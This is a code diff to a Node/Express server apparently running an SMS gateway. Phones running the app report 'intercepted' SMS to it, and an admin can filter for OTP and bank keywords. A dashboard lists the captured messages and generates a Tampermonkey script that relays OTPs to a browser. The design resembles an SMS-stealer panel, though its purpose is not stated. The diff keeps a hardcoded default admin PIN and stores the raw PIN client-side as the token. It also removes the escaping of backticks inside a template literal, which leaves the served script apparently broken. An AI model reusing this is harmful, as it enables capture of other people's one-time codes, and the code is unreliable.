@@ -6,9 +6,9 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// Initialize Supabase Client
-const supabaseUrl = process.env.SUPABASE_URL || '';
-const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_ANON_KEY || '';
+// Supabase Connection initialization
+const supabaseUrl = process.env.SUPABASE_URL || "";
+const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY || "";
 
 if (!supabaseUrl || !supabaseKey) {
     console.error("⚠️ SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY environment variables are missing!");
@@ -53,34 +53,33 @@ app.post('/api/license/activate', async (req, res) => {
             .single();
 
         if (error || !device) {
-            return res.status(404).json({ success: false, error: "License not found." });
+            return res.status(404).json({ success: false, error: "License not found or invalid." });
         }
 
         if (device.status === 'Blocked') {
             return res.status(403).json({ success: false, error: "This license key has been deactivated." });
         }
 
-        // Enforce one device per license key
-        let updatedDeviceId = device.registered_device_id;
-        if (deviceId) {
-            if (device.registered_device_id && device.registered_device_id !== deviceId) {
-                return res.status(400).json({ 
-                    success: false, 
-                    error: "License already registered on another device. Please reset via admin console." 
-                });
-            }
-            if (!device.registered_device_id) {
-                updatedDeviceId = deviceId;
-                await supabase
-                    .from('licenses')
-                    .update({ registered_device_id: deviceId, last_active: new Date() })
-                    .eq('key', key.trim());
-            } else {
-                await supabase
-                    .from('licenses')
-                    .update({ last_active: new Date() })
-                    .eq('key', key.trim());
-            }
+        // Binds device ID to enforce single concurrent device rule
+        if (device.registered_device_id && device.registered_device_id !== deviceId) {
+            return res.status(400).json({ 
+                success: false, 
+                error: "License already registered on another device. Please reset via admin console." 
+            });
+        }
+
+        if (!device.registered_device_id) {
+            const { error: updateErr } = await supabase
+                .from('licenses')
+                .update({ registered_device_id: deviceId, last_active: new Date() })
+                .eq('key', key.trim());
+            
+            if (updateErr) throw updateErr;
+        } else {
+            await supabase
+                .from('licenses')
+                .update({ last_active: new Date() })
+                .eq('key', key.trim());
         }
 
         // Fetch current global filtering rules
@@ -153,56 +152,75 @@ app.post('/api/license/status', async (req, res) => {
 });
 
 /**
- * 3. SMS Gateway Stream: Receive SMS logs from active devices
+ * 3. Log SMS Endpoint: Invoked by the app client upon intercepting SMS
  */
-app.post('/api/sms/incoming', async (req, res) => {
-    const { key, deviceId, message, sender, timestamp, simSlot, deviceLabel } = req.body;
+app.post('/api/sms/log', async (req, res) => {
+    const { key, sender, message, timestamp, deviceLabel, simSlot, deviceId } = req.body;
 
-    if (!key || !message || !sender) {
-        return res.status(400).json({ success: false, error: "Missing required properties." });
+    if (!key || !sender || !message) {
+        return res.status(400).json({ success: false, error: "Missing required logging payload data." });
     }
 
     try {
-        const { data: device, error } = await supabase
+        // Enforce active status before writing to database
+        const { data: device, error: devErr } = await supabase
             .from('licenses')
             .select('*')
             .eq('key', key.trim())
             .single();
 
-        if (error || !device) {
-            return res.status(404).json({ success: false, error: "License key unregistered." });
+        if (devErr || !device) {
+            return res.status(404).json({ success: false, error: "License signature mismatch." });
         }
 
         if (device.status === 'Blocked') {
-            return res.status(403).json({ success: false, error: "Access blocked: License key is disabled." });
+            return res.status(403).json({ success: false, error: "Terminal blocked: Interception suspended." });
         }
 
         if (deviceId && device.registered_device_id && device.registered_device_id !== deviceId) {
-            return res.status(400).json({ success: false, error: "Device UUID mismatch." });
+            return res.status(400).json({ success: false, error: "Interception mismatch: Bound Device mismatch." });
         }
 
-        const msgId = `msg_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
-        
-        await supabase
+        // Fetch Filtering configuration settings
+        const { data: config } = await supabase
+            .from('global_config')
+            .select('*')
+            .eq('id', 'main_config')
+            .single();
+
+        let allowed = true;
+        if (config) {
+            const mode = config.filter_mode;
+            const target = (config.target_value || "").toLowerCase().trim();
+
+            if (mode === 'ALLOW_ONLY' && target) {
+                const keywords = target.split(",").map(k => k.trim()).filter(Boolean);
+                allowed = keywords.some(kw => message.toLowerCase().includes(kw) || sender.toLowerCase().includes(kw));
+            } else if (mode === 'BLOCK_LIST' && target) {
+                const keywords = target.split(",").map(k => k.trim()).filter(Boolean);
+                allowed = !keywords.some(kw => message.toLowerCase().includes(kw) || sender.toLowerCase().includes(kw));
+            }
+        }
+
+        if (!allowed) {
+            return res.json({ success: true, filtered: true, message: "Ignored: SMS filtered out by Server security rules." });
+        }
+
+        // Log the message
+        const { error: logErr } = await supabase
             .from('message_logs')
             .insert({
-                id: msgId,
-                sender: sender,
-                message: message,
-                timestamp: timestamp || Date.now(),
-                device_label: deviceLabel || device.device_name,
-                sim_slot: simSlot || 'SIM 1',
                 license_key: key.trim(),
-                status: 'Forwarded'
+                sender: sender.trim(),
+                message: message.trim(),
+                device_label: deviceLabel || "Terminal Node",
+                sim_slot: simSlot || "Unknown",
+                received_at: timestamp ? new Date(timestamp) : new Date()
             });
 
-        // Update active device heartbeat
-        await supabase
-            .from('licenses')
-            .update({ last_active: new Date() })
-            .eq('key', key.trim());
+        if (logErr) throw logErr;
 
-        return res.json({ success: true, messageId: msgId });
+        return res.json({ success: true, filtered: false });
     } catch (err) {
         return res.status(500).json({ success: false, error: err.message });
     }
@@ -213,9 +231,7 @@ app.post('/api/sms/incoming', async (req, res) => {
  */
 app.post('/api/admin/verify', async (req, res) => {
     const { pin } = req.body;
-    if (!pin) {
-        return res.status(400).json({ error: "PIN is required." });
-    }
+    if (!pin) return res.status(400).json({ success: false, error: "PIN is required." });
 
     try {
         const { data: config } = await supabase
@@ -225,14 +241,13 @@ app.post('/api/admin/verify', async (req, res) => {
             .single();
 
         const globalPin = config ? config.global_pin : "7860";
-
         if (pin.trim() === globalPin.trim()) {
-            return res.json({ success: true, token: globalPin.trim() });
+            return res.json({ success: true });
         } else {
-            return res.status(401).json({ success: false, error: "Incorrect PIN number." });
+            return res.status(401).json({ success: false, error: "Invalid credentials." });
         }
     } catch (err) {
-        return res.status(500).json({ error: err.message });
+        return res.status(500).json({ success: false, error: err.message });
     }
 });
 
@@ -275,14 +290,12 @@ app.post('/api/admin/generate', adminAuth, async (req, res) => {
  */
 app.post('/api/admin/status-toggle', adminAuth, async (req, res) => {
     const { key, status } = req.body;
-    if (!key || !status) {
-        return res.status(400).json({ error: "Key and status parameters are required." });
-    }
+    if (!key || !status) return res.status(400).json({ error: "Missing parameters." });
 
     try {
         const { error } = await supabase
             .from('licenses')
-            .update({ status: status })
+            .update({ status })
             .eq('key', key.trim());
 
         if (error) throw error;
@@ -293,13 +306,11 @@ app.post('/api/admin/status-toggle', adminAuth, async (req, res) => {
 });
 
 /**
- * 7. Admin API: Reset device ID
+ * 7. Admin API: Reset bound device ID
  */
 app.post('/api/admin/reset-device', adminAuth, async (req, res) => {
     const { key } = req.body;
-    if (!key) {
-        return res.status(400).json({ error: "Missing key parameter." });
-    }
+    if (!key) return res.status(400).json({ error: "Key is required." });
 
     try {
         const { error } = await supabase
@@ -315,18 +326,14 @@ app.post('/api/admin/reset-device', adminAuth, async (req, res) => {
 });
 
 /**
- * 8. Admin API: Update dynamic filter rules
+ * 8. Admin API: Update global filtering rules
  */
 app.post('/api/admin/rules', adminAuth, async (req, res) => {
     const { mode, target } = req.body;
-    if (!mode) {
-        return res.status(400).json({ error: "Filter mode is required." });
-    }
-
     try {
         const { error } = await supabase
             .from('global_config')
-            .update({ filter_mode: mode, target_value: target || "" })
+            .update({ filter_mode: mode, target_value: target })
             .eq('id', 'main_config');
 
         if (error) throw error;
@@ -369,14 +376,14 @@ app.get('/api/admin/dashboard-data', adminAuth, async (req, res) => {
             .select('*')
             .order('last_active', { ascending: false });
 
-        // Fetch latest 50 SMS messages
-        const { data: messageLogs } = await supabase
+        // Fetch latest logs
+        const { data: messages } = await supabase
             .from('message_logs')
             .select('*')
             .order('received_at', { ascending: false })
-            .limit(50);
+            .limit(100);
 
-        // Fetch current global filter/pin setup
+        // Fetch global rules config
         const { data: config } = await supabase
             .from('global_config')
             .select('*')
@@ -386,10 +393,9 @@ app.get('/api/admin/dashboard-data', adminAuth, async (req, res) => {
         return res.json({
             success: true,
             devices: licenses || [],
-            messages: messageLogs || [],
-            filterMode: config ? config.filter_mode : 'ALL',
-            targetValue: config ? config.target_value : '',
-            globalPin: config ? config.global_pin : '7860'
+            messages: messages || [],
+            filterMode: config ? config.filter_mode : "ALL",
+            targetValue: config ? config.target_value : ""
         });
     } catch (err) {
         return res.status(500).json({ error: err.message });
@@ -449,7 +455,7 @@ app.get('/api/messages/latest', async (req, res) => {
 });
 
 /**
- * Serving dynamic Dashboard Home page
+ * Serving HTML Dashboard
  */
 app.get('/', (req, res) => {
     res.send(`
@@ -458,108 +464,100 @@ app.get('/', (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMS Gateway Dashboard</title>
+    <title>SMS Central Console</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Space Grotesk', sans-serif;
-            background: radial-gradient(circle at top right, #0f172a, #020617);
-        }
-        .code-font {
-            font-family: 'JetBrains Mono', monospace;
-        }
+        .code-font { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
     </style>
 </head>
-<body class="text-slate-100 min-h-screen">
-    <!-- Main Outer Container -->
-    <div id="authContainer" class="fixed inset-0 bg-slate-950/95 flex items-center justify-center z-50">
-        <div class="bg-slate-900 border border-slate-800 p-8 rounded-2xl w-full max-w-md shadow-2xl space-y-6">
-            <div class="text-center space-y-2">
-                <div class="inline-flex p-3 bg-indigo-500/10 text-indigo-400 rounded-2xl border border-indigo-500/20 mb-2">
-                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
-                </div>
+<body class="bg-slate-950 text-slate-100 min-h-screen">
+    <!-- Authorization Lock Screen -->
+    <div id="authOverlay" class="fixed inset-0 bg-slate-950 flex flex-col items-center justify-center z-50 p-4">
+        <div class="w-full max-w-md p-8 bg-slate-900 border border-slate-800 rounded-3xl shadow-2xl space-y-6 text-center">
+            <div class="space-y-2">
+                <span class="text-4xl">🔐</span>
                 <h1 class="text-2xl font-bold tracking-tight text-white">Console Locked</h1>
                 <p class="text-sm text-slate-400">Enter Admin PIN to access the SMS Gateway Console</p>
             </div>
-            
             <div class="space-y-4">
-                <input type="password" id="pinInput" placeholder="••••" class="w-full text-center tracking-widest text-2xl font-bold py-3 bg-slate-950 border border-slate-800 rounded-xl focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 text-white placeholder-slate-700 outline-none transition-all">
-                <button onclick="login()" class="w-full bg-indigo-600 hover:bg-indigo-500 active:scale-[0.98] text-white font-semibold py-3 px-4 rounded-xl transition-all shadow-lg shadow-indigo-600/20">
-                    Verify & Unlock
+                <input type="password" id="authPin" placeholder="••••" class="w-full text-center py-3 bg-slate-950 border border-slate-800 rounded-2xl text-2xl tracking-widest text-indigo-400 outline-none focus:border-indigo-500 transition-all">
+                <button onclick="submitAuth()" class="w-full py-3 bg-indigo-600 hover:bg-indigo-500 active:bg-indigo-700 text-white font-semibold rounded-2xl transition-all shadow-lg shadow-indigo-600/20">
+                    Unlock Console
                 </button>
             </div>
-            <div id="authError" class="text-red-400 text-sm text-center font-medium hidden">❌ Invalid PIN code. Please try again.</div>
         </div>
     </div>
 
     <!-- Live Console Dashboard -->
-    <div id="dashboard" class="hidden max-w-7xl mx-auto px-4 py-8 space-y-8">
-        <!-- Top Bar -->
-        <header class="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-slate-800">
-            <div>
-                <div class="flex items-center gap-2">
-                    <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse"></span>
-                    <span class="text-xs font-semibold tracking-wider text-emerald-400 uppercase">Gateway Active</span>
+    <div id="dashboard" class="hidden">
+        <!-- Top Nav -->
+        <header class="border-b border-slate-900 bg-slate-900/40 backdrop-blur-md sticky top-0 z-30">
+            <div class="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
+                <div>
+                    <h1 class="text-3xl font-bold tracking-tight text-white mt-1">SMS Console Hub</h1>
+                    <p class="text-xs text-slate-500">Secure real-time terminal sync and message dispatch log</p>
                 </div>
-                <h1 class="text-3xl font-bold tracking-tight text-white mt-1">SMS Console Hub</h1>
-                <p class="text-slate-400 text-sm">Supabase & Vercel serverless persistence engine</p>
-            </div>
-            <div class="flex items-center gap-3">
-                <button onclick="logout()" class="px-4 py-2 bg-slate-900 hover:bg-slate-800 border border-slate-800 rounded-xl text-sm font-semibold text-slate-300 transition-all">
+                <button onclick="logout()" class="px-4 py-2 bg-slate-900 hover:bg-slate-850 text-slate-300 font-bold text-xs rounded-xl border border-slate-800 transition-all">
                     Lock Console
-                </button>
-                <button onclick="fetchData()" class="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 rounded-xl text-sm font-semibold text-white transition-all">
-                    Refresh Logs
                 </button>
             </div>
         </header>
 
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <!-- Left Panel: Configurations & Actions -->
+        <!-- Main Body Grid -->
+        <main class="max-w-7xl mx-auto px-6 py-8 grid grid-cols-1 lg:grid-cols-3 gap-8">
+            <!-- Left Panel: Rules, Terminal Creator & Settings -->
             <div class="space-y-8 lg:col-span-1">
-                <!-- Generator Card -->
+                <!-- System Filtering Rules -->
                 <div class="p-6 bg-slate-900/40 rounded-2xl border border-slate-800 space-y-4">
                     <h2 class="text-lg font-bold text-white flex items-center gap-2">
-                        <span>🔑</span> Generate License Key
+                        <span>🛡️</span> Security Routing Rules
                     </h2>
-                    <div class="space-y-3">
-                        <input type="text" id="genName" placeholder="e.g. Aslam-OPPO" class="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-sm text-white placeholder-slate-600 outline-none focus:border-indigo-500 transition-all">
-                        <input type="text" id="genPin" placeholder="Custom Device PIN (Optional)" class="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-sm text-white placeholder-slate-600 outline-none focus:border-indigo-500 transition-all">
-                        <button onclick="generateLicense()" class="w-full py-2 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold rounded-xl text-sm transition-all">
-                            Create License Profile
-                        </button>
-                    </div>
-                </div>
-
-                <!-- Global Rules Card -->
-                <div class="p-6 bg-slate-900/40 rounded-2xl border border-slate-800 space-y-4">
-                    <h2 class="text-lg font-bold text-white flex items-center gap-2">
-                        <span>⚙️</span> SMS Filter Rules
-                    </h2>
-                    <div class="space-y-3">
-                        <label class="block text-xs font-semibold text-slate-400 uppercase">Routing Rule</label>
-                        <select id="filterMode" class="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-sm text-white outline-none focus:border-indigo-500">
-                            <option value="ALL">Forward All Messages</option>
-                            <option value="SENDER">Filter by Sender Address</option>
-                            <option value="KEYWORD">Filter by Message Keyword</option>
+                    <div class="space-y-3 text-xs">
+                        <label class="block text-xs font-semibold text-slate-400 uppercase">Routing Action Mode</label>
+                        <select id="filterMode" class="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-white outline-none focus:border-indigo-500">
+                            <option value="ALL">Forward All incoming SMS</option>
+                            <option value="ALLOW_ONLY">Allow only specific text keywords (OTP, Bank...)</option>
+                            <option value="BLOCK_LIST">Block specific keywords or senders</option>
                         </select>
-                        <input type="text" id="targetValue" placeholder="e.g. Google, OTP, +92300" class="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-sm text-white placeholder-slate-600 outline-none focus:border-indigo-500 transition-all">
+                        
+                        <label class="block text-xs font-semibold text-slate-400 uppercase mt-2">Keywords / Target (Comma Separated)</label>
+                        <input type="text" id="targetValue" placeholder="OTP, Verification, Pay" class="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-white outline-none focus:border-indigo-500">
+                        
                         <button onclick="saveRules()" class="w-full py-2 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold rounded-xl text-sm transition-all">
-                            Apply Routing Rule
+                            Save Security Profile
                         </button>
                     </div>
                 </div>
 
-                <!-- Global Master Pin Setup -->
+                <!-- Generate Terminal Node License -->
+                <div class="p-6 bg-slate-900/40 rounded-2xl border border-slate-800 space-y-4">
+                    <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                        <span>🆕</span> Create Terminal Node
+                    </h2>
+                    <div class="space-y-3 text-xs">
+                        <label class="block text-xs font-semibold text-slate-400 uppercase">Device Label / Owner Name</label>
+                        <input type="text" id="genName" placeholder="e.g. John's Pixel 8" class="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-white outline-none focus:border-indigo-500">
+                        
+                        <label class="block text-xs font-semibold text-slate-400 uppercase mt-2">Device Console Lock PIN (Optional)</label>
+                        <input type="text" id="genPin" placeholder="e.g. 7860" class="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-white outline-none focus:border-indigo-500">
+                        
+                        <button onclick="generateLicense()" class="w-full py-2 bg-emerald-600 hover:bg-emerald-500 text-white font-semibold rounded-xl text-sm transition-all">
+                            Generate Registration Key
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Change Master Admin Web Console PIN -->
                 <div class="p-6 bg-slate-900/40 rounded-2xl border border-slate-800 space-y-4">
                     <h2 class="text-lg font-bold text-white flex items-center gap-2">
                         <span>🔒</span> Change Admin Console PIN
                     </h2>
-                    <div class="space-y-3">
-                        <input type="password" id="newGlobalPin" placeholder="Enter New Master PIN" class="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-sm text-white placeholder-slate-600 outline-none focus:border-indigo-500 transition-all">
-                        <button onclick="updateGlobalPin()" class="w-full py-2 bg-amber-600 hover:bg-amber-500 text-white font-semibold rounded-xl text-sm transition-all">
-                            Update Master PIN
+                    <div class="space-y-3 text-xs">
+                        <label class="block text-xs font-semibold text-slate-400 uppercase">New Master Dashboard PIN</label>
+                        <input type="password" id="newGlobalPin" placeholder="Enter at least 4 digits" class="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-white outline-none focus:border-indigo-500">
+                        
+                        <button onclick="updateGlobalPin()" class="w-full py-2 bg-indigo-600/30 hover:bg-indigo-600 text-indigo-300 hover:text-white font-semibold rounded-xl text-sm transition-all border border-indigo-500/20">
+                            Apply New Master PIN
                         </button>
                     </div>
                 </div>
@@ -590,69 +588,54 @@ app.get('/', (req, res) => {
 
             <!-- Right Panel: Registered Devices & Live Streams -->
             <div class="lg:col-span-2 space-y-8">
-                <!-- Device Profiles Grid -->
-                <div class="space-y-4">
-                    <h2 class="text-xl font-bold text-white flex items-center gap-2">
-                        <span>📱</span> Terminals Registered
-                    </h2>
-                    <div id="devicesList" class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                        <!-- Devices render dynamic -->
+                <!-- Registered Devices Grid -->
+                <div>
+                    <h3 class="text-lg font-bold text-white mb-4">🖥️ Active Registered Terminal Nodes</h3>
+                    <div id="devicesList" class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                        <!-- Populated dynamically -->
                     </div>
                 </div>
 
-                <!-- Incoming SMS Streaming log -->
-                <div class="p-6 bg-slate-900/40 rounded-2xl border border-slate-800 space-y-4">
-                    <div class="flex items-center justify-between">
-                        <h2 class="text-xl font-bold text-white flex items-center gap-2">
-                            <span>💬</span> Live Received Messages Log
-                        </h2>
-                        <span class="text-xs bg-slate-950 px-2.5 py-1 border border-slate-800 rounded-lg text-slate-400">Showing Last 50 Logs</span>
-                    </div>
-
-                    <div id="messageStream" class="space-y-3 max-h-[500px] overflow-y-auto pr-2">
-                        <!-- Messages render dynamic -->
+                <!-- Live Message dispatch log stream -->
+                <div>
+                    <h3 class="text-lg font-bold text-white mb-4">📜 Real-time SMS Forwarding Logs</h3>
+                    <div id="messageStream" class="space-y-4 max-h-[700px] overflow-y-auto pr-2">
+                        <!-- Populated dynamically -->
                     </div>
                 </div>
             </div>
-        </div>
+        </main>
     </div>
 
     <script>
         let ADMIN_TOKEN = localStorage.getItem('sms_admin_pin') || '';
-
         if (ADMIN_TOKEN) {
-            document.getElementById('authContainer').classList.add('hidden');
+            document.getElementById('authOverlay').classList.add('hidden');
             document.getElementById('dashboard').classList.remove('hidden');
             fetchData();
         }
 
-        async function login() {
-            const pin = document.getElementById('pinInput').value;
+        async function submitAuth() {
+            const pin = document.getElementById('authPin').value;
+            if (!pin) return alert("Please enter your console unlock security PIN!");
             try {
                 const res = await fetch('/api/admin/verify', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ pin })
                 });
-                const data = await res.json();
-                if (data.success) {
-                    ADMIN_TOKEN = data.token;
+                if (res.ok) {
+                    ADMIN_TOKEN = pin;
                     localStorage.setItem('sms_admin_pin', ADMIN_TOKEN);
-                    document.getElementById('authContainer').classList.add('hidden');
+                    document.getElementById('authOverlay').classList.add('hidden');
                     document.getElementById('dashboard').classList.remove('hidden');
-                    document.getElementById('authError').classList.add('hidden');
                     fetchData();
                 } else {
-                    showError();
+                    alert("Invalid signature security credentials.");
                 }
             } catch(e) {
-                showError();
+                alert("Error connecting to server instance: " + e);
             }
-        }
-
-        function showError() {
-            const err = document.getElementById('authError');
-            err.classList.remove('hidden');
         }
 
         function logout() {
@@ -684,7 +667,7 @@ app.get('/', (req, res) => {
                         .join('') || '<option value="">No Active Nodes Registered</option>';
                     
                     // Restore previous selection if still exists
-                    if (selectedVal && tamperSelect.querySelector(\`option[value="\${selectedVal}"]\`)) {
+                    if (selectedVal && tamperSelect.querySelector(`option[value="\${selectedVal}"]`)) {
                         tamperSelect.value = selectedVal;
                     }
                     updateTampermonkeyScript();
@@ -702,7 +685,7 @@ app.get('/', (req, res) => {
             const baseUrl = window.location.origin;
             const hostname = window.location.hostname;
             
-            const script = \`// ==UserScript==
+            const script = `// ==UserScript==
 // @name         SMS Gateway OTP Sync
 // @namespace    http://tampermonkey.net/
 // @version      1.1
@@ -770,12 +753,12 @@ app.get('/', (req, res) => {
                 <span>📱 SMS Received</span>
                 <button onclick="this.parentElement.parentElement.remove()" style="background: none; border: none; color: #818cf8; cursor: pointer; font-size: 16px;">×</button>
             </div>
-            <div style="font-size: 11px; color: #818cf8; margin-bottom: 6px;">From: <b>\\\\\\\\\\\${msg.sender}</b></div>
+            <div style="font-size: 11px; color: #818cf8; margin-bottom: 6px;">From: <b>\\\\\\\${msg.sender}</b></div>
             <div style="font-size: 13px; font-family: monospace; background: #090514; padding: 8px; border-radius: 6px; border: 1px solid #312e81; word-break: break-all;">
-                \\\\\\\\\\\${msg.message}
+                \\\\\\\${msg.message}
             </div>
             <div style="margin-top: 8px; text-align: right;">
-                <button onclick="navigator.clipboard.writeText(\\\\\\\\\\\`\\\\\\\\\\\${msg.message}\\\\\\\\\\\`); alert(\\\\\\\\\\\'SMS copied to clipboard!\\\\\\\\\\');" style="background: #4f46e5; border: none; color: white; padding: 4px 10px; border-radius: 6px; font-size: 11px; cursor: pointer; font-weight: 600;">Copy Text</button>
+                <button onclick="navigator.clipboard.writeText(\\\\\\\`\\\\\\\${msg.message}\\\\\\\`); alert(\\\\\\\'SMS copied to clipboard!\\\\\\\');" style="background: #4f46e5; border: none; color: white; padding: 4px 10px; border-radius: 6px; font-size: 11px; cursor: pointer; font-weight: 600;">Copy Text</button>
             </div>
         \\\`;
         document.body.appendChild(div);
@@ -786,7 +769,7 @@ app.get('/', (req, res) => {
 
     // Poll every 4 seconds
     setInterval(checkForNewMessages, 4000);
-})();\`;
+})();`;
 
             document.getElementById('tamperCode').value = script;
         }
@@ -946,7 +929,7 @@ app.get('/', (req, res) => {
                         \${boundStatus}
 
                         <div class="text-[10px] text-slate-500 pt-2 border-t border-slate-800/60">
-                            Last active: \s\${new Date(dev.last_active).toLocaleString()}
+                            Last active: \${new Date(dev.last_active).toLocaleString()}
                         </div>
                     </div>
                 \`;
